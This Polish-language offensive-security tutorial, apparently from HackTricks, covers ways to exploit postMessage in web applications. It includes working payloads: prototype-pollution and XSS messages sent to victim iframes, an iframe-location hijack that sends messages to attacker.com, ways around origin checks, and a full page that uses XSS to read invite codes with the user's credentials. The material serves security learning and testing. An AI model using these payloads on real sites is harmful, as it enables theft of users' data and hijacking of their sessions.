# Wulnerowalności PostMessage

## Wulnerowalności PostMessage

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wyślij **PostMessage**

**PostMessage** używa następującej funkcji do wysyłania wiadomości:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauważ, że **targetOrigin** może być '\*' lub adresem URL, takim jak _https://company.com._\
W **drugim scenariuszu** wiadomość może być wysłana tylko do tej domeny (nawet jeśli pochodzenie obiektu okna jest inne).\
Jeśli używany jest **znak wieloznaczny**, wiadomości mogą być wysyłane do dowolnej domeny i zostaną wysłane do pochodzenia obiektu Window.

### Atakowanie iframe i znaku wieloznacznego w **targetOrigin**

Jak wyjaśniono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeśli znajdziesz stronę, która może być **osadzona w iframe** (brak ochrony `X-Frame-Header`) i która wysyła **wrażliwe** wiadomości za pomocą **postMessage** z użyciem **znaku wieloznacznego** (\*), możesz **zmodyfikować** pochodzenie **iframe** i **wyciec** wrażliwą wiadomość do domeny kontrolowanej przez ciebie.\
Zauważ, że jeśli strona może być osadzona w iframe, ale **targetOrigin** jest **ustawiony na adres URL, a nie na znak wieloznaczny**, ten **trik nie zadziała**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Wykorzystanie addEventListener

**`addEventListener`** to funkcja używana przez JS do deklarowania funkcji, która oczekuje na **`postMessages`**.\
Będzie używany kod podobny do poniższego:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Zauważ w tym przypadku, jak **pierwszą rzeczą**, którą robi kod, jest **sprawdzanie pochodzenia**. Jest to niezwykle **ważne**, zwłaszcza jeśli strona ma wykonywać **jakiekolwiek czynności wymagające uwagi** z otrzymanymi informacjami (takie jak zmiana hasła). **Jeśli nie sprawdzi pochodzenia, atakujący mogą zmusić ofiary do wysyłania dowolnych danych do tych punktów końcowych** i zmieniać hasła ofiar (w tym przykładzie).

### Wyliczanie

Aby **znaleźć nasłuchiwacze zdarzeń** na bieżącej stronie, można:

* **Przeszukać** kod JS w poszukiwaniu `window.addEventListener` i `$(window).on` (_wersja JQuery_)
* **Wykonać** w narzędziach deweloperskich konsoli: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Przejdź do** _Elements --> Event Listeners_ w narzędziach deweloperskich przeglądarki

![](<../../.gitbook/assets/image (617).png>)

* Użyj **rozszerzenia przeglądarki** takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przeglądarki będą **przechwytywać wszystkie wiadomości** i pokazywać je.

### Ominiecie sprawdzania pochodzenia

- Atrybut **`event.isTrusted`** jest uważany za bezpieczny, ponieważ zwraca `True` tylko dla zdarzeń generowanych przez prawdziwe działania użytkownika. Chociaż jest to trudne do obejścia, jeśli jest poprawnie zaimplementowane, jego znaczenie w sprawdzaniu bezpieczeństwa jest godne uwagi.

- Użycie metody **`indexOf()`** do walidacji pochodzenia w zdarzeniach PostMessage może być podatne na obejście. Przykład ilustrujący tę podatność to:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** z `String.prototype.search()` jest przeznaczona do wyrażeń regularnych, a nie do ciągów znaków. Przekazanie czegokolwiek innego niż wyrażenie regularne prowadzi do niejawnej konwersji na wyrażenie regularne, co czyni metodę potencjalnie niebezpieczną. Dzieje się tak dlatego, że w wyrażeniach regularnych kropka (.) działa jako znak wieloznaczny, umożliwiając obejście walidacji za pomocą specjalnie skonstruowanych domen. Na przykład:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcja **`match()`**, podobnie jak `search()`, przetwarza wyrażenia regularne. Jeśli wyrażenie regularne jest nieprawidłowo skonstruowane, może być podatne na obejście.

- Funkcja **`escapeHtml`** ma na celu oczyszczenie danych wejściowych poprzez unikanie znaków specjalnych. Jednak nie tworzy nowego obiektu z oczyszczonymi danymi, ale nadpisuje właściwości istniejącego obiektu. To zachowanie może być wykorzystane. W szczególności, jeśli obiekt można manipulować w taki sposób, że jego kontrolowana właściwość nie uwzględnia `hasOwnProperty`, `escapeHtml` nie będzie działać zgodnie z oczekiwaniami. Przykłady poniżej to ilustrują:

- Oczekiwane niepowodzenie:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Ominięcie oczyszczania:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

W kontekście tej podatności obiekt `File` jest szczególnie podatny ze względu na swoją tylko do odczytu właściwość `name`. Ta właściwość, gdy jest używana w szablonach, nie jest oczyszczana przez funkcję `escapeHtml`, co prowadzi do potencjalnych zagrożeń dla bezpieczeństwa.

- Właściwość `document.domain` w JavaScript może być ustawiona przez skrypt w celu skrócenia domeny, co pozwala na bardziej elastyczną politykę tego samego pochodzenia w obrębie tej samej domeny nadrzędnej.

### Ominięcie e.origin == window.origin

Podczas osadzania strony internetowej w **ramce sandbox** za pomocą %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, ważne jest zrozumienie, że pochodzenie ramki zostanie ustawione na `null`. Jest to szczególnie istotne przy pracy z **atrybutami sandbox** i ich wpływem na bezpieczeństwo i funkcjonalność.

Poprzez określenie **`allow-popups`** w atrybucie sandbox, każde okno popup otwarte z ramki dziedziczy ograniczenia sandboxu swojego rodzica. Oznacza to, że chyba że jest również zawarty atrybut **`allow-popups-to-escape-sandbox`**, pochodzenie okna popup jest również ustawione na `null`, zgodnie z pochodzeniem ramki.

W rezultacie, gdy pod tymi warunkami otwarte jest okno popup i wiadomość jest wysyłana z ramki do okna popup za pomocą **`postMessage`**, zarówno nadawca, jak i odbiorca mają ustawione pochodzenie na `null`. Sytuacja ta prowadzi do scenariusza, w którym **`e.origin == window.origin`** jest prawdziwe (`null == null`), ponieważ zarówno ramka, jak i okno popup mają taką samą wartość pochodzenia `null`.

Aby uzyskać więcej informacji, **przeczytaj**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Ominięcie e.source

Można sprawdzić, czy wiadomość pochodzi z tego samego okna, w którym nasłuchuje skrypt (szczególnie interesujące dla **Skryptów zawartości z rozszerzeń przeglądarki**), aby sprawdzić, czy wiadomość została wysłana z tej samej strony:
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Możesz wymusić, aby **`e.source`** wiadomości było null, tworząc **iframe**, który **wysyła** **postMessage** i jest **natychmiast usuwany**.

Aby uzyskać więcej informacji, **przeczytaj:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Ominięcie nagłówka X-Frame

Aby przeprowadzić te ataki, idealnie byłoby **umieścić stronę ofiary** wewnątrz `iframe`. Jednak niektóre nagłówki, takie jak `X-Frame-Header`, mogą temu **zapobiec**.\
W takich scenariuszach nadal można użyć mniej dyskretnego ataku. Można otworzyć nową kartę z podatną aplikacją internetową i komunikować się z nią:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kradzież wiadomości wysłanej do dziecka przez zablokowanie strony głównej

Na poniższej stronie możesz zobaczyć, jak można ukraść **wrażliwe dane postmessage** wysłane do **dziecięcego iframe** przez **zablokowanie** strony **głównej** przed wysłaniem danych i wykorzystanie **XSS w dziecku** do **wycieku danych** przed ich otrzymaniem:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Kradzież wiadomości poprzez modyfikację lokalizacji iframe

Jeśli możesz umieścić stronę w iframe bez nagłówka X-Frame-Header, która zawiera inne iframe, możesz **zmienić lokalizację tego dziecka iframe**, więc jeśli otrzymuje **postmessage** wysłane za pomocą **wildcard**, atakujący może **zmienić** pochodzenie tego iframe na stronę **kontrolowaną** przez niego i **ukraść** wiadomość:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Prototype Pollution i/lub XSS

W scenariuszach, w których dane wysyłane za pomocą `postMessage` są wykonywane przez JS, możesz **umieścić stronę w iframe** i **wykorzystać** **zanieczyszczenie prototypu/XSS** wysyłając exploit za pomocą `postMessage`.

Kilka **bardzo dobrze wyjaśnionych ataków XSS za pomocą `postMessage`** można znaleźć pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Przykład ataku wykorzystującego **zanieczyszczenie prototypu, a następnie XSS** za pomocą `postMessage` do `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Dla **więcej informacji**:

* Link do strony o [**zanieczyszczeniu prototypu**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do strony o [**XSS**](../xss-cross-site-scripting/)
* Link do strony o [**zanieczyszczeniu prototypu po stronie klienta do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencje

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Do ćwiczeń: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
